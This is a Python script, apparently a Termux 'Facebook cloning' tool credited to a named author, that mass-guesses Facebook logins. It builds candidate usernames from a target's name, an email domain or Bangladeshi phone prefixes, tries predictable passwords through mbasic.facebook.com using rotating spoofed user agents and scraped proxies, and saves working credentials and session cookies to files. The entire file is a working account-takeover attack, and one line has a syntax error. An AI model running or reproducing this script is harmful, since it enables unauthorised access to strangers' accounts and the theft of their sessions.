#HASAN TERMUX HELPING ZONE
#use with cradit
#ASRAFUL ISLAM HASAN
#Contract WhatsApp : 016.....
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
logo = ("""
  \033[1;92m██   ██  █████  ███████  █████  ███    ██ 
  \033[1;92m██   ██ ██   ██ ██      ██   ██ ████   ██ 
  \033[1;92m███████ ███████ ███████ ███████ ██ ██  ██ 
  \033[1;92m██   ██ ██   ██      ██ ██   ██ ██  ██ ██ 
  \033[1;92m██   ██ ██   ██ ███████ ██   ██ ██   ████ 
         
 \033[1;93m×××××××××××××××××\033[1;93m××××××××××××××\033[1;93m××××××××××××××××××
 \033[1;93m|     \033[1;96m[✓] CREATED BY\33[0;m   :  \033[1;96mASRAFUL ISLAM HASAN   \033[1;93m|
 \033[1;93m|     \033[1;32m[✓] FACEBOK      : \033[1;34m Hasa N                \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] GITHUB       :  \033[1;35mKgHasan               \033[1;93m|
 \033[1;93m|     \033[1;36m[✓] TOOL STATUS  : \033[1;36m Random Cloning Bd     \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] TEAM         :  \033[1;35mKST                   \033[1;93m|
 \033[1;93m|     \033[1;36m[✓] TOOL VIRSION :  \033[1;36m0.0                   \033[1;93m|
 \033[1;93m×××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m×××××××××××××××××
 \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m PLZ SAPPORT ME BRO....
 \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m HASAN TERMUX HELPING ZONE....
 \033[1;93m××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m×××××××××××××××××""")

class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print(" \033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m Facebook CLONING \033[1;93m(Email) ")
        print(" \033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m Facebook CLONING \033[1;93m(Name)")
        print(" \033[1;91m[\033[1;92m3\033[1;91m]\033[1;92m Facebook CLONING \033[1;93m(BD number)")
        print(" \033[1;91m[\033[1;92m4\033[1;91m]\033[1;92m Follow My Account ")
        print(" \033[1;91m[\033[1;92m0\033[1;91m]\033[1;91m Exit")
        HASAN =input(" \033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m Choose : ")
        if HASAN in ["1", "01"]:
            v1()
            os.system('xdg-open https://facebook.com/groups/551365756758487/')
        if HASAN in ["2", "02"]:
            v2()
            os.system('xdg-open https://www.facebook.com/copy.link.erorr404')
        if HASAN in ["3","03"]:
            v3()
            os.system('xdg-open https://github.com/KgHasan)
        if HASAN in [" 0", "00"]:
            exit()
        else:
            exit()
def v1():
    user=[]
    os.system('clear')
    print(logo)
    kode = input(' \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m target fast name : ')
    kodex = input(' \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m target last name :  ')
    print(' \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m example Doamin : @gmail.com, @yahoo.com ')
    doamin = input(' \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m  Input Doamin  : ')
    limit = int(input(' \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m Account Limite: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m  Total ids:\033[1;92m '+tl)
        print(f" \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m  Target Doamin:\033[1;92m {doamin}")
        print(' \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m  The process has been started')
        print(' \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m  Wait for ids ')
        print(51*'×')
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(51*'×')
    print(' \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m Crack process has been completed')
    print(' \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m Ids saved in ok.txt,cp.txt')
    print(51*'×')
def v2():
    user=[]
    os.system('clear')
    print(logo)
    kode = input(' \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m  target fast name : ')
    kodex = input('  \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m target last name :  ')
    doamin = '.'
    limit = int(input('\033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m Account Limite : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m  Total ids:\033[1;92m '+tl)
        print(f" \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m  Target Doamin:\033[1;92m Facebook CLONING (name)")
        print(' \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m  The process has been started')
        print(' \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m  Wait for ids ')
        print(51*'×')
        for guru in user:
            uid = kode+doamin+kodex+guru
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(51*'×')
    print(' \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m Crack process has been completed')
    print(' \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m Ids saved in ok.txt,cp.txt')
    print(51*'×')
def v3():
    user=[]
    os.system('clear')
    print(logo)
    kode = input(' \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m Enter sim code: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    doamin = ' Facebook CLONING (BD number) '
    limit = int(input(' \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m Account Limite : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m  Total ids:\033[1;92m '+tl)
        print(f" \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m  Target Doamin:\033[1;92m {doamin}")
        print(' \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m  The process has been started')
        print(' \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m  Wait for ids ')
        print(51*'×')
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(51*'×')
    print(' \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m Crack process has been completed')
    print(' \033[1;91m[\033[1;92m•\033[1;91m] \033[1;92m Ids saved in ok.txt,cp.txt')
    print(51*'×')
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92mHASAN-VAI\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://t.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[HASAN-OK] {uid}|{ps}")
                print(f" \n Cookie : {coki}")
                open('/sdcard/HASAN/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[HASAN-CP] {cid}|{ps}")
                open('/sdcard/HASAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[HASAN-VAI] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
